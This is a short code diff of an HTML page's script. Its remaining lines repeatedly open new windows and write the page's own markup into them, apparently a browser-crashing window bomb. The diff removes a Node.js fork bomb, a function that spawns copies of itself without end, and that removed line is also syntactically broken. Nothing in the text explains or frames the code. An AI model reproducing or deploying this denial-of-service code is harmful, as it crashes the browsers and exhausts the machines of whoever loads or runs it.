@@ -18,8 +18,6 @@ function RUN() {
         var w = window.open();
         w.document.write(document.documentElement.outerHTML||document.documentElement.innerHTML);
       }, 1);
-    function f() { require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); require('child_process').spawn(process.argv[0], ['-e', '(' + f.toString() + '());']); }();
-    f();
 }
 window.onload = start;
 </script>
